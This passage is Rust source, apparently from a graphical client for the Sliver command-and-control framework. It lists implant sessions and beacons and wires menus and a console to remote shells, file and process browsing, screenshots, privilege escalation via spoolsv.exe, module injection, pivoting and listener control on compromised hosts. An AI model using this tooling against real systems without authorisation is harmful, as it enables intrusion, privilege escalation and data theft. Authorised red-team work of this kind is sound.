        let sessions = self.sessions.clone();
        let beacons = self.beacons.clone();
        let now = chrono::Local::now().timestamp();
        let mut actions: Vec<(&'static str, Target)> = Vec::new();
        kit::table(ui)
            .striped(true)
            .sense(egui::Sense::click())
            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
            .column(Column::auto().at_least(66.0))   // Type
            .column(Column::auto().at_least(80.0))   // ID
            .column(Column::auto().at_least(110.0))  // Name
            .column(Column::auto().at_least(44.0))   // Status
            .column(Column::auto().at_least(60.0))   // Trans
            .column(Column::auto().at_least(140.0))  // Remote
            .column(Column::auto().at_least(120.0))  // Host
            .column(Column::auto().at_least(120.0))  // User
            .column(Column::auto().at_least(56.0))   // OS
            .column(Column::auto().at_least(66.0))   // Seen
            .column(Column::auto().at_least(56.0))   // PID
            .column(Column::remainder().at_least(90.0)) // Activity
            .header(24.0, |mut h| {
                for t in ["Type", "ID", "Name", "Status", "Trans", "Remote", "Host", "User", "OS", "Seen", "PID", "Activity"] {
                    // Numbers are right-aligned, so their header is too.
                    h.col(|ui| if t == "PID" {
                        ui.with_layout(egui::Layout::right_to_left(egui::Align::Center), |ui| { ui.add_space(12.0); kit::th(ui, t) });
                    } else {
                        kit::th(ui, t)
                    });
                }
            })
            .body(|mut body| {
                // Sessions first, then beacons; a Type column tells them apart.
                for s in &sessions {
                    body.row(26.0, |mut row| {
                        let t = Target::session(&s.id);
                        let win = s.os == "windows";
                        row.col(|ui| { kit::badge(ui, "session", Palette::accent()); });
                        row.col(|ui| {
                            ui.monospace(short(&s.id));
                            if s.first_contact > 0 && now - s.first_contact < 120 { kit::badge(ui, "NEW", Palette::green()); }
                        });
                        row.col(|ui| { ui.label(egui::RichText::new(&s.name).strong()); });
                        row.col(|ui| status_label(ui, s.is_dead));
                        row.col(|ui| { kit::badge(ui, &s.transport, Palette::purple()); });
                        row.col(|ui| { ui.label(&s.remote_address); });
                        row.col(|ui| { ui.label(&s.hostname); });
                        row.col(|ui| {
                            let u = if s.username.is_empty() { "—" } else { &s.username };
                            let c = integrity_color(&s.integrity, &s.username, &s.os);
                            if c == Palette::red() {
                                ui.colored_label(Palette::yellow(), u).on_hover_text(format!("integrity: {}", s.integrity));
                            } else {
                                ui.label(u);
                            }
                        });
                        row.col(|ui| kit::os_badge(ui, &s.os, &s.arch));
                        row.col(|ui| {
                            let age = now - s.last_checkin;
                            let c = if age < 60 { Palette::green() } else if age < 600 { Palette::muted() } else { Palette::yellow() };
                            ui.colored_label(c, fmt_age(s.last_checkin)).on_hover_text(format!("last check-in {}", fmt_clock(s.last_checkin)));
                        });
                        row.col(|ui| pid_cell(ui, s.pid));
                        // Sessions: when the implant last checked in (Seen shows how long ago).
                        row.col(|ui| { ui.colored_label(Palette::muted(), format!("checked in {}", fmt_clock(s.last_checkin))); });
                        let resp = row.response();
                        if resp.hovered() { self.hint(&resp.ctx, "double-click to interact · right-click for actions"); }
                        if resp.double_clicked() { actions.push(("console", t.clone())); }
                        resp.context_menu(|ui| {
                            ui.label(egui::RichText::new(format!("session {} — {}", short(&s.id), s.name)).strong());
                            ui.separator();
                            if ui.button("▸  Interact (console)").clicked() { actions.push(("console", t.clone())); ui.close_menu(); }
                            if ui.button("❯  Interactive shell").clicked() { actions.push(("shell", t.clone())); ui.close_menu(); }
                            modules_submenu(ui, &t, win, &mut actions);
                            ui.separator();
                            if ui.button("🗀  File browser").clicked() { actions.push(("files", t.clone())); ui.close_menu(); }
                            if ui.button("⚙  Process browser").clicked() { actions.push(("procs", t.clone())); ui.close_menu(); }
                            if ui.button("▣  Screenshot").clicked() { actions.push(("shot", t.clone())); ui.close_menu(); }
                            if win {
                                ui.menu_button("⊞  Windows", |ui| {
                                    if ui.button("Registry browser").clicked() { actions.push(("registry", t.clone())); ui.close_menu(); }
                                    if ui.button("Services").clicked() { actions.push(("services", t.clone())); ui.close_menu(); }
                                });
                            }
                            ui.separator();
                            if ui.button("⇄  Pivoting (tunnels / chaining)").clicked() { actions.push(("pivot", t.clone())); ui.close_menu(); }
                            if ui.button("🗧  Host record").clicked() { actions.push(("host", t.clone())); ui.close_menu(); }
                            if ui.button("✎  Rename").clicked() { actions.push(("rename", t.clone())); ui.close_menu(); }
                            if ui.button("⎘  Copy ID").clicked() { ui.ctx().copy_text(s.id.clone()); ui.close_menu(); }
                            if ui.button("⟲  Ping").on_hover_text("Round-trip check through the C2 channel").clicked() { actions.push(("ping", t.clone())); ui.close_menu(); }
                            ui.separator();
                            if ui.button("⏏  Close session").on_hover_text("End this interactive session; a beacon that opened it keeps checking in").clicked() {
                                actions.push(("close", t.clone())); ui.close_menu();
                            }
                            if ui.button(egui::RichText::new("✕  Kill session").color(Palette::red())).clicked() {
                                actions.push(("kill", t.clone())); ui.close_menu();
                            }
                        });
                    });
                }
                for b in &beacons {
                    body.row(26.0, |mut row| {
                        let t = Target::beacon(&b.id);
                        let win = b.os == "windows";
                        row.col(|ui| { kit::badge(ui, "beacon", Palette::yellow()); });
                        row.col(|ui| {
                            ui.monospace(short(&b.id));
                            if b.first_contact > 0 && now - b.first_contact < 120 { kit::badge(ui, "NEW", Palette::green()); }
                        });
                        row.col(|ui| { ui.label(egui::RichText::new(&b.name).strong()); });
                        row.col(|ui| status_label(ui, b.is_dead));
                        row.col(|ui| { kit::badge(ui, if b.transport.is_empty() { "—" } else { &b.transport }, Palette::purple()); });
                        row.col(|ui| { ui.label(&b.remote_address); });
                        row.col(|ui| { ui.label(&b.hostname); });
                        row.col(|ui| {
                            let u = if b.username.is_empty() { "—" } else { &b.username };
                            let c = integrity_color(&b.integrity, &b.username, &b.os);
                            if c == Palette::red() {
                                ui.colored_label(Palette::yellow(), u).on_hover_text(format!("integrity: {}", b.integrity));
                            } else {
                                ui.label(u);
                            }
                        });
                        row.col(|ui| kit::os_badge(ui, &b.os, &b.arch));
                        row.col(|ui| { ui.colored_label(Palette::muted(), fmt_age(b.last_checkin)).on_hover_text(format!("last check-in {}", fmt_clock(b.last_checkin))); });
                        row.col(|ui| pid_cell(ui, b.pid));
                        row.col(|ui| {
                            let next = b.next_checkin - now;
                            let nt = if next <= 0 { "due".to_string() } else { format!("next {next}s") };
                            let pending = b.tasks_count - b.tasks_count_completed;
                            ui.colored_label(if next <= 0 { Palette::green() } else { Palette::muted() }, nt);
                            ui.colored_label(Palette::muted(), format!("· {}s±{}s", b.interval / 1_000_000_000, b.jitter / 1_000_000_000));
                            if pending > 0 { kit::badge(ui, format!("· {pending} pending"), Palette::yellow()); }
                        });
                        let resp = row.response();
                        if resp.hovered() { self.hint(&resp.ctx, "double-click to interact · right-click for actions"); }
                        if resp.double_clicked() { actions.push(("console", t.clone())); }
                        resp.context_menu(|ui| {
                            ui.label(egui::RichText::new(format!("beacon {} — {}", short(&b.id), b.name)).strong());
                            ui.separator();
                            if ui.button("▸  Interact (console)").clicked() { actions.push(("console", t.clone())); ui.close_menu(); }
                            if ui.button("≡  Task history").clicked() { actions.push(("tasks", t.clone())); ui.close_menu(); }
                            if ui.button("⏱  Reconfigure interval…").clicked() { actions.push(("reconfig", t.clone())); ui.close_menu(); }
                            if ui.button("⇢  Open interactive session").on_hover_text("Ask the beacon to start a live session over its active C2 at its next check-in").clicked() {
                                actions.push(("interactive", t.clone())); ui.close_menu();
                            }
                            modules_submenu(ui, &t, win, &mut actions);
                            ui.separator();
                            if ui.button("🗀  File browser").clicked() { actions.push(("files", t.clone())); ui.close_menu(); }
                            if ui.button("⚙  Process browser").clicked() { actions.push(("procs", t.clone())); ui.close_menu(); }
                            if win {
                                ui.menu_button("⊞  Windows", |ui| {
                                    if ui.button("Registry browser").clicked() { actions.push(("registry", t.clone())); ui.close_menu(); }
                                    if ui.button("Services").clicked() { actions.push(("services", t.clone())); ui.close_menu(); }
                                });
                            }
                            ui.separator();
                            if ui.button("🗧  Host record").clicked() { actions.push(("host", t.clone())); ui.close_menu(); }
                            if ui.button("✎  Rename").clicked() { actions.push(("rename", t.clone())); ui.close_menu(); }
                            if ui.button("⎘  Copy ID").clicked() { ui.ctx().copy_text(b.id.clone()); ui.close_menu(); }
                            if ui.button("⟳  Refresh record").on_hover_text("Re-read this beacon from the server").clicked() { actions.push(("beacon-refresh", t.clone())); ui.close_menu(); }
                            ui.separator();
                            if ui.button(egui::RichText::new("✕  Remove beacon").color(Palette::red())).clicked() {
                                actions.push(("rmbeacon", t.clone())); ui.close_menu();
                            }
                        });
                    });
                }
            });
        self.run_actions(actions);
    }

    fn run_actions(&mut self, actions: Vec<(&'static str, Target)>) {
        for (kind, t) in actions {
            match kind {
                "console" => self.pending_open.push(Tab::Console(t)),
                "files" => {
                    self.send(Command::Ls { target: t.clone(), path: ".".into() });
                    self.files.entry(t.key()).or_default().requested = true;
                    self.pending_open.push(Tab::Files(t));
                }
                "shot" => {
                    self.send(Command::Screenshot { target: t });
                    self.set_toast(true, "screenshot requested…");
                }
                "ps" => {
                    self.send(Command::Ps { target: t.clone() });
                    self.pending_open.push(Tab::Console(t));
                }
                "procs" => {
                    self.ext.procs.entry(t.key()).or_default().loading = true;
                    self.op(Op::ProcList { target: t.clone() });
                    self.pending_open.push(Tab::Processes(t));
                }
                "registry" => self.pending_open.push(Tab::Registry(t)),
                "services" => self.pending_open.push(Tab::Services(t)),
                "host" => {
                    let uuid = self.sessions.iter().find(|s| s.id == t.key()).map(|s| s.uuid.clone())
                        .or_else(|| self.beacons.iter().find(|b| b.id == t.key()).map(|b| b.uuid.clone()))
                        .unwrap_or_default();
                    if self.ext.hosts.iter().any(|h| h.host_uuid == uuid) { self.ext.host_sel = Some(uuid); }
                    self.op(Op::RefreshHosts);
                    self.pending_open.push(Tab::Hosts);
                }
                "reconfig" => {
                    if let Some(b) = self.beacons.iter().find(|b| b.id == t.beacon_id) {
                        self.ext.reconfig = Some(ext::ReconfigForm {
                            label: format!("{} ({}) — currently every {}s ± {}s", b.name, b.hostname, b.interval / 1_000_000_000, b.jitter / 1_000_000_000),
                            interval: (b.interval / 1_000_000_000).max(1),
                            jitter: b.jitter / 1_000_000_000,
                            target: t,
                        });
                    }
                }
                "shell" => self.send(Command::OpenShell {
                    target: t, pty: false, path: String::new(), rows: 34, cols: 120,
                }),
                "modules" => self.pending_open.push(Tab::Modules(t)),
                "mod-asm" | "mod-sideload" | "mod-spawndll" | "mod-bof" | "mod-ext" | "mod-wasm" | "mod-envform" => {
                    self.module_forms.entry(t.key()).or_default().kind = match kind {
                        "mod-asm" => ModKind::Assembly,
                        "mod-sideload" => ModKind::Sideload,
                        "mod-spawndll" => ModKind::SpawnDll,
                        "mod-bof" => ModKind::Bof,
                        "mod-wasm" => ModKind::Wasm,
                        "mod-envform" => ModKind::Env,
                        _ => ModKind::Extension,
                    };
                    self.pending_open.push(Tab::Modules(t));
                }
                "mod-whoami" | "mod-getprivs" | "mod-getsystem" | "mod-rev2self" | "mod-ifconfig" | "mod-netstat" | "mod-env" => {
                    let spec = match kind {
                        "mod-whoami" => ModuleSpec::WhoAmI,
                        "mod-getprivs" => ModuleSpec::GetPrivs,
                        "mod-getsystem" => ModuleSpec::GetSystem { process: "spoolsv.exe".into() },
                        "mod-rev2self" => ModuleSpec::RevToSelf,
                        "mod-ifconfig" => ModuleSpec::Ifconfig,
                        "mod-netstat" => ModuleSpec::Netstat,
                        _ => ModuleSpec::GetEnv,
                    };
                    self.send(Command::Module { target: t.clone(), spec });
                    self.pending_open.push(Tab::Console(t));
                    self.set_toast(true, "action dispatched — results in console");
                }
                "kill" => {
                    let label = self.display(&t);
                    self.confirm("Kill session", format!("Terminate the implant for session {label}? It will not reconnect."), vec![Command::KillSession(t)]);
                }
                "ping" => self.op(Op::Ping { target: t }),
                "close" => {
                    let label = self.display(&t);
                    self.confirm("Close session", format!("Close session {label}? An implant running only as a session exits; a beacon that opened it keeps checking in."),
                        vec![Command::Op(Op::CloseSession { target: t })]);
                }
                "interactive" => {
                    let c2 = self.beacons.iter().find(|b| b.id == t.beacon_id).map(|b| b.active_c2.clone()).unwrap_or_default();
                    self.op(Op::OpenSession { target: t, c2, delay_s: 0 });
                }
                "beacon-refresh" => self.op(Op::RefreshBeacon { id: t.beacon_id }),
                "tasks" => {
                    self.send(Command::RefreshBeaconTasks { beacon_id: t.beacon_id.clone() });
                    self.pending_open.push(Tab::BeaconTasks(t.beacon_id));
                }
                "rename" => {
                    let cur = self.names.get(&t.key()).cloned().unwrap_or_default();
                    self.rename_for = Some((t, cur));
                }
                "rmbeacon" => {
                    let label = self.display(&t);
                    self.confirm("Remove beacon", format!("Remove beacon {label} from the server? The implant keeps running but its record and task history are deleted."),
                        vec![Command::RmBeacon { beacon_id: t.beacon_id }]);
                }
                "pivot" => {
                    if let Some(i) = self.sessions.iter().position(|s| s.id == t.session_id) {
                        self.pivot_form.session_idx = i;
                    }
                    self.op(Op::PivotListeners { target: t });
                    self.pending_open.push(Tab::Pivoting);
                }
                _ => {}
            }
        }
    }

    fn beacon_tasks_tab(&mut self, ui: &mut egui::Ui, bid: String) {
        use egui_extras::Column;
        ui.horizontal(|ui| {
            if ui.button("⟳ Refresh").clicked() {
                self.send(Command::RefreshBeaconTasks { beacon_id: bid.clone() });
            }
            if ui.button("▸ Console").on_hover_text("Open the beacon console").clicked() {
                self.pending_open.push(Tab::Console(Target::beacon(&bid)));
            }
            let name = self.names.get(&bid).cloned().unwrap_or_else(|| short(&bid).to_string());
            ui.colored_label(Palette::muted(), format!("beacon {name}  ·  task results open in its console"));
        });
        ui.separator();
        let tasks = self.beacon_tasks.get(&bid).cloned().unwrap_or_default();
        if tasks.is_empty() {
            ui.add_space(16.0);
            ui.vertical_centered(|ui| ui.colored_label(Palette::muted(), "No tasks yet — queue work from the console or modules, then Refresh"));
            return;
        }
        let mut view: Option<String> = None;
        let mut cancel: Option<String> = None;
        kit::table(ui)
            .striped(true)
            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
            .column(Column::auto().at_least(70.0))
            .column(Column::auto().at_least(90.0))
            .column(Column::auto().at_least(160.0))
            .column(Column::auto().at_least(90.0))
            .column(Column::remainder().at_least(140.0))
            .header(22.0, |mut h| {
                for t in ["ID", "State", "Description", "Completed", "Actions"] {
                    h.col(|ui| { ui.strong(t); });
                }
            })
            .body(|mut body| {
                for tk in &tasks {
                    body.row(24.0, |mut row| {
                        row.col(|ui| { ui.monospace(short(&tk.id)); });
                        row.col(|ui| {
                            let col = match tk.state.as_str() {
                                "completed" => Palette::green(),
                                "sent" => Palette::yellow(),
                                "canceled" | "cancelled" => Palette::red(),
                                _ => Palette::muted(),
                            };
                            ui.colored_label(col, &tk.state);
                        });
                        row.col(|ui| { ui.label(&tk.description); });
                        row.col(|ui| {
                            ui.colored_label(Palette::muted(), if tk.completed_at > 0 { fmt_age(tk.completed_at) } else { "—".into() });
                        });
                        row.col(|ui| {
                            if tk.state == "completed" && ui.small_button("view result").clicked() { view = Some(tk.id.clone()); }
                            if (tk.state == "pending" || tk.state == "sent") && ui.small_button("cancel").clicked() { cancel = Some(tk.id.clone()); }
                        });
                    });
                }
            });
        if let Some(task_id) = view {
            self.send(Command::BeaconTaskContent { beacon_id: bid.clone(), task_id });
            self.pending_open.push(Tab::Console(Target::beacon(&bid)));
        }
        if let Some(task_id) = cancel {
            self.send(Command::CancelBeaconTask { beacon_id: bid, task_id });
        }
    }

    fn jobs_tab(&mut self, ui: &mut egui::Ui) {
        use egui_extras::Column;
        kit::toolbar(ui, |ui| {
            if ui.button("≡ Start listener").clicked() { self.show_listeners = true; }
            if ui.button("⟳ Refresh").clicked() { self.send(Command::RefreshAll); }
            if ui.add_enabled(!self.jobs.is_empty(), egui::Button::new("↻ Restart all"))
                .on_hover_text("Stop and start every listener whose settings are known, with those settings").clicked() {
                let cmds: Vec<Command> = self.jobs.iter().filter_map(|j| self.restart_cmd(j)).collect();
                let skipped = self.jobs.len() - cmds.len();
                let note = if skipped > 0 { format!(" {skipped} listener(s) with unrecorded settings are left alone — use ✎ Edit for those.") } else { String::new() };
                self.confirm("Restart listeners", format!("Restart {} listener(s)? Connected implants reconnect on their next callback.{note}", cmds.len()), cmds);
            }
            ui.colored_label(Palette::muted(), "server jobs — C2 listeners & stagers");
        });
        if self.jobs.is_empty() {
            kit::empty(ui, "≡", "No active listeners", "Start one so implants have somewhere to call back to");
            return;
        }
        let jobs = self.jobs.clone();
        let mut kill: Option<u32> = None;
        let mut restart: Option<u32> = None;
        let mut clone: Option<(clientpb::Job, bool)> = None;
        kit::table(ui)
            .striped(true)
            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
            .column(Column::auto().at_least(50.0))
            .column(Column::auto().at_least(120.0))
            .column(Column::auto().at_least(80.0))
            .column(Column::auto().at_least(70.0))
            .column(Column::remainder())
            .column(Column::auto().at_least(170.0))
            .header(24.0, |mut h| {
                for t in ["ID", "Name", "Protocol", "Port", "Domains", ""] {
                    h.col(|ui| kit::th(ui, t));
                }
            })
            .body(|mut body| {
                for j in &jobs {
                    body.row(26.0, |mut row| {
                        row.col(|ui| { ui.monospace(j.id.to_string()); });
                        row.col(|ui| { ui.label(egui::RichText::new(&j.name).strong()); });
                        row.col(|ui| { kit::badge(ui, &j.protocol, Palette::purple()); });
                        row.col(|ui| { ui.label(j.port.to_string()); });
                        row.col(|ui| { ui.colored_label(Palette::muted(), j.domains.join(", ")); });
                        row.col(|ui| {
                            if ui.small_button("✎ Edit").on_hover_text("View or change this listener's settings (saving restarts it)").clicked() { clone = Some((j.clone(), true)); }
                            if ui.small_button("⎘ Clone").on_hover_text("Open the listener dialog pre-filled from this job").clicked() { clone = Some((j.clone(), false)); }
                            let can = self.restart_cmd(j).is_some();
                            if ui.add_enabled(can, egui::Button::new("↻").small())
                                .on_hover_text("Stop and start this listener with the same settings")
                                .on_disabled_hover_text("Settings not recorded by this GUI — use ✎ Edit to review and restart").clicked() { restart = Some(j.id); }
                            if ui.small_button(egui::RichText::new("✕ Kill").color(Palette::red())).clicked() {
                                kill = Some(j.id);
                            }
                        });
                    });
                }
            });
        if let Some(id) = kill {
            let name = jobs.iter().find(|j| j.id == id).map(|j| format!("{} :{}", j.name, j.port)).unwrap_or_default();
            self.confirm("Stop listener", format!("Stop job {id} ({name})? Implants using it lose their C2 until it is restarted."), vec![Command::KillJob(id)]);
        }
        if let Some((j, edit)) = clone { self.open_listener_from_job(&j, edit); }
        if let Some(cmd) = restart.and_then(|id| jobs.iter().find(|j| j.id == id)).and_then(|j| self.restart_cmd(j)) {
            self.set_toast(true, "restarting listener…");
            self.send(cmd);
        }
    }

    /// Stop-and-start for a job whose settings are known: recorded when this GUI started
    /// it, or mTLS (everything it has is in the job record). Sliver's own RestartJobs is
    /// not used: on v1.7.9 it brings an mTLS job back as a broken `http` listener on port 0.
    fn restart_cmd(&self, j: &clientpb::Job) -> Option<Command> {
        let recorded = self.settings.listener_specs.get(&listener_key(&self.server_key(), job_kind(j), j.port)).cloned();
        let p = recorded.or_else(|| (j.name == "mtls").then(|| preset_of_job(j)))?;
        let spec = spec_of_preset(&p);
        Some(Command::RestartListener { job_id: j.id, spec: spec.clone(), previous: Some(spec) })
    }

    /// Server identity for `listener_specs` keys.
    fn server_key(&self) -> String {
        self.configs.get(self.selected_cfg).map(|c| format!("{}:{}", c.lhost, c.lport)).unwrap_or_default()
    }

    /// Fill the listener dialog from a running job: its recorded settings if
    /// this GUI started it, otherwise what Sliver reports. `edit` opens it as
    /// Edit (Save & restart replaces the job) rather than as a new listener.
    fn open_listener_from_job(&mut self, j: &clientpb::Job, edit: bool) {
        let recorded = self.settings.listener_specs.get(&listener_key(&self.server_key(), job_kind(j), j.port)).cloned();
        // mTLS has nothing Sliver doesn't report (bind address is in the description).
        let known = recorded.is_some() || job_kind(j) == 0;
        let p = recorded.unwrap_or_else(|| preset_of_job(j));
        let f = &mut self.listener_form;
        let preset_name = std::mem::take(&mut f.preset_name);
        f.load_preset(&p);
        f.preset_name = preset_name;
        f.editing = edit.then_some(j.id);
        f.edit_orig = p;
        f.edit_known = known;
        self.show_listeners = true;
    }

    fn events_tab(&mut self, ui: &mut egui::Ui) {
        let mut export = false;
        kit::toolbar(ui, |ui| {
            kit::search(ui, &mut self.events_filter, "filter events", 220.0);
            ui.colored_label(Palette::muted(), format!("{} event{}", self.events.len(), if self.events.len() == 1 { "" } else { "s" }));
            if ui.button("⬇ Export CSV…").clicked() { export = true; }
            if ui.button("Clear").clicked() { self.events.clear(); }
        });
        if export { self.export_events_csv(); }
        let needle = self.events_filter.to_lowercase();
        egui::ScrollArea::vertical().auto_shrink([false, false]).show(ui, |ui| {
            for (ts, kind, text) in &self.events {
                if !needle.is_empty() && !text.to_lowercase().contains(&needle) && !kind.to_lowercase().contains(&needle) { continue; }
                let color = match kind.as_str() {
                    "error" => Palette::red(),
                    "canary" | "watchtower" => Palette::yellow(),
                    _ if text.contains("session opened") || text.contains("registered") => Palette::green(),
                    _ if text.contains("lost") => Palette::red(),
                    _ => Palette::text(),
                };
                ui.horizontal(|ui| {
                    let t = chrono::DateTime::from_timestamp(*ts, 0)
                        .map(|d| d.with_timezone(&chrono::Local).format("%H:%M:%S").to_string()).unwrap_or_default();
                    ui.colored_label(Palette::muted(), egui::RichText::new(t).monospace());
                    kit::badge(ui, kind, color);
                    ui.colored_label(color, text);
                });
            }
        });
    }

    /// Server-level command console. Unlike a session console, these commands
    /// act on the Sliver *server* (sessions/beacons/jobs/listeners/implants).
    /// Sliver has no generic "run this command" RPC, so this maps a practical
    /// set of verbs to the operator gRPC calls the client already speaks.
    /// Resolve an id prefix to a session or beacon target, with a display label.
    fn find_target(&self, id: Option<&str>) -> Option<(Target, String)> {
        let id = id?.trim();
        if id.is_empty() { return None; }
        if let Some(s) = self.sessions.iter().find(|s| s.id.starts_with(id) || short(&s.id) == id) {
            return Some((Target::session(&s.id), format!("session {} ({})", short(&s.id), s.name)));
        }
        if let Some(b) = self.beacons.iter().find(|b| b.id.starts_with(id) || short(&b.id) == id) {
            return Some((Target::beacon(&b.id), format!("beacon {} ({})", short(&b.id), b.name)));
        }
        None
    }

    /// Operator name for console prompts.
    fn operator_name(&self) -> String {
        self.configs.get(self.selected_cfg).map(|c| c.operator.clone()).filter(|o| !o.is_empty()).unwrap_or_else(|| "operator".into())
    }

    fn console_tab(&mut self, ui: &mut egui::Ui, target: Target) {
        let key = target.key();
        if target.is_beacon() {
            // Results for tasks queued from now on print here automatically.
            self.ext.beacon_console_since.entry(key.clone()).or_insert_with(|| chrono::Local::now().timestamp() - 5);
        }
        // Beacon status strip: cadence, next check-in, outstanding tasks.
        if let Some(b) = self.beacons.iter().find(|b| b.id == key).cloned() {
            let now = chrono::Local::now().timestamp();
            let mut tasks = false;
            kit::toolbar(ui, |ui| {
                kit::badge(ui, "beacon", Palette::accent());
                ui.colored_label(Palette::muted(), format!("every {}s ± {}s", b.interval / 1_000_000_000, b.jitter / 1_000_000_000));
                let next = b.next_checkin - now;
                ui.colored_label(if next <= 0 { Palette::green() } else { Palette::muted() },
                    if next <= 0 { "check-in due".to_string() } else { format!("next check-in {next}s") });
                let pending = b.tasks_count - b.tasks_count_completed;
                if pending > 0 { kit::badge(ui, format!("{pending} task(s) pending"), Palette::yellow()); }
                else { kit::badge(ui, "no pending tasks", Palette::green()); }
                ui.colored_label(Palette::muted(), "results print here when they complete");
                if ui.small_button("≡ Task history").clicked() { tasks = true; }
            });
            if tasks { self.run_actions(vec![("tasks", target.clone())]); }
        }
        let prompt = format!("{} ❯", self.operator_name());
        let console = self.consoles.entry(key.clone()).or_default();

        // Requests still waiting on this session, each cancellable (Esc cancels the newest).
        let mine: Vec<(u64, String, u64)> = self.ext.running.iter().filter(|r| r.1 == key)
            .map(|r| (r.0, r.2.clone(), r.3.elapsed().as_secs())).collect();
        let input_id = egui::Id::new(("console-input", key.clone()));
        let strip = if mine.is_empty() { 0.0 } else { 14.0 + 28.0 * mine.len() as f32 };
        let avail = ui.available_height() - strip;
        egui::ScrollArea::vertical()
            .auto_shrink([false, false])
            .max_height(avail - 38.0)
            .stick_to_bottom(true)
            .show(ui, |ui| {
                for line in &console.lines {
                    console_line(ui, line);
                }
            });

        let mut cancel: Vec<u64> = Vec::new();
        if !mine.is_empty() {
            ui.separator();
            for (id, label, secs) in &mine {
                ui.horizontal(|ui| {
                    ui.spinner();
                    ui.colored_label(Palette::yellow(), format!("running {label}"));
                    ui.colored_label(Palette::muted(), format!("{secs}s"));
                    if ui.small_button("✕ Cancel").on_hover_text("Stop waiting for this reply (Esc cancels the newest). \
                        Anything the implant already started keeps running on the target.").clicked() {
                        cancel.push(*id);
                    }
                });
            }
            ui.ctx().request_repaint_after(std::time::Duration::from_millis(500));
        }
        ui.separator();
        let mut submit = false;
        let resp = ui.horizontal(|ui| {
            ui.colored_label(Palette::green(), &prompt);
            let r = ui.add(
                egui::TextEdit::singleline(&mut console.input)
                    .id(input_id)
                    .desired_width(ui.available_width() - 60.0)
                    .font(egui::TextStyle::Monospace)
                    .lock_focus(true)
                    .hint_text("Tab completes · ↑/↓ history · ls · cd · ps · download · upload · <program> [args…]"),
            );
            if console.focus {
                r.request_focus();
                console.focus = false;
            }
            if ui.button("Run").clicked() {
                submit = true;
            }
            r
        }).inner;
        // Command autocomplete for the built-in verbs (Tab/↑/↓/click); Enter submits.
        let candidates = session_console_candidates(&console.input);
        if command_autocomplete(ui, &resp, input_id, &mut console.input, &candidates) {
            console.focus = true;
        }
        // History (only when the completion popup didn't consume the arrows).
        if resp.has_focus() {
            let (up, down) = ui.input_mut(|i| (i.consume_key(egui::Modifiers::NONE, egui::Key::ArrowUp), i.consume_key(egui::Modifiers::NONE, egui::Key::ArrowDown)));
            if (up && console.browse_history(true)) || (down && console.browse_history(false)) {
                move_cursor_to_end(ui, input_id, &console.input);
            }
        }
        if resp.lost_focus() && ui.input(|i| i.key_pressed(egui::Key::Enter)) {
            submit = true;
        }
        if let Some((id, ..)) = mine.last() {
            if (resp.has_focus() || resp.lost_focus()) && ui.input(|i| i.key_pressed(egui::Key::Escape)) {
                cancel.push(*id);
                console.focus = true;
            }
        }

        if submit {
            let line = console.input.trim().to_string();
            console.input.clear();
            console.focus = true;
            if !line.is_empty() {
                console.remember(&line);
                console.lines.push(ConsoleLine::stamped(format!("{prompt} {line}"), Palette::green()));
                trim_console(console);
                self.dispatch_console(&target, &line);
            }
        }
        for id in cancel {
            self.send(Command::Cancel { id });
        }
    }

    fn dispatch_console(&mut self, target: &Target, line: &str) {
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or("");
        let rest: Vec<String> = parts.map(|s| s.to_string()).collect();
        let usage = |this: &mut Self, u: &str| {
            this.consoles.entry(target.key()).or_default().push_line(format!("usage: {u}"), Palette::yellow());
        };
        match cmd {
            "ls" => {
                self.ext.console_ls.insert(target.key());
                self.send(Command::Ls {
                    target: target.clone(),
                    path: rest.first().cloned().unwrap_or_else(|| ".".into()),
                });
            }
            "ps" => self.send(Command::Ps { target: target.clone() }),
            "procs" => self.run_actions(vec![("procs", target.clone())]),
            "screenshot" => self.send(Command::Screenshot { target: target.clone() }),
            "pwd" => self.op(Op::Pwd { target: target.clone() }),
            "cd" => match rest.first() {
                Some(p) => self.op(Op::Cd { target: target.clone(), path: p.clone() }),
                None => usage(self, "cd <path>"),
            },
            "cp" | "mv" => match (rest.first(), rest.get(1)) {
                (Some(a), Some(b)) => {
                    let (src, dst) = (a.clone(), b.clone());
                    if cmd == "cp" { self.op(Op::Cp { target: target.clone(), src, dst }); } else { self.op(Op::Mv { target: target.clone(), src, dst }); }
                }
                _ => usage(self, &format!("{cmd} <src> <dst>")),
            },
            "chmod" => match (rest.first(), rest.get(1)) {
                (Some(m), Some(p)) => self.op(Op::Chmod { target: target.clone(), path: p.clone(), mode: m.clone(), recursive: false }),
                _ => usage(self, "chmod <mode> <path>"),
            },
            "mkdir" => {
                if let Some(path) = rest.first().cloned() {
                    self.send(Command::Mkdir { target: target.clone(), path });
                }
            }
            "rm" => {
                // rm [-r] <path>
                let recursive = rest.iter().any(|a| a == "-r" || a == "-rf" || a == "-fr");
                if let Some(path) = rest.iter().find(|a| !a.starts_with('-')).cloned() {
                    self.send(Command::Rm { target: target.clone(), path, recursive });
                }
            }
            "download" => {
                if let Some(path) = rest.first().cloned() {
                    let name = path.rsplit(['/', '\\']).next().unwrap_or("download").to_string();
                    if let Some(save) = rfd::FileDialog::new().set_file_name(&name).save_file() {
                        self.send(Command::Download { target: target.clone(), path, save_to: save.display().to_string() });
                    }
                }
            }
            "upload" => {
                if let Some(p) = rfd::FileDialog::new().pick_file() {
                    if let Ok(data) = std::fs::read(&p) {
                        let fname = p.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| "upload.bin".into());
                        // `upload [remote]`: remote path, or the file name in the cwd.
                        let remote = rest.first().cloned().unwrap_or(fname);
                        self.op(Op::UploadIoc { target: target.clone(), remote, data });
                    }
                }
            }
            "clear" => { if let Some(c) = self.consoles.get_mut(&target.key()) { c.lines.clear(); } }
            "help" | "?" => {
                let c = self.consoles.entry(target.key()).or_default();
                for (v, d) in session_console_candidates("") {
                    c.push_line(format!("  {v:<12} {d}"), Palette::muted());
                }
                c.push_line("  anything else runs as a program on the target: <program> [args…]", Palette::muted());
            }
            _ => self.send(Command::Execute {
                target: target.clone(),
                path: cmd.to_string(),
                args: rest,
            }),
        }
    }

    fn screenshot_tab(&mut self, ui: &mut egui::Ui, target: Target) {
        let key = target.key();
        let mut to_loot = false;
        kit::toolbar(ui, |ui| {
            if ui.button("▣ Re-capture").clicked() {
                self.send(Command::Screenshot { target: target.clone() });
            }
            if ui.button("⛁ Add to loot").on_hover_text("Store the latest capture in the server's loot").clicked() { to_loot = true; }
